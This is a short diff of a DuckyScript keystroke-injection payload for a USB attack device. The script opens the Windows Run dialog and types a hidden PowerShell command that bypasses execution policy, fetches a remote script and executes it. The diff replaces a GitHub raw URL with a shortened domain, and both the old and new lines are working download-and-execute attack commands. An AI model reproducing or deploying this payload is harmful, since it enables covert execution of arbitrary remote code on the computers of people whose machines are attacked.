@@ -12,5 +12,5 @@ REM     ------------------------------------------------------------------------
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/wefoundyou.ps1 | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/yzb | iex
 ENTER
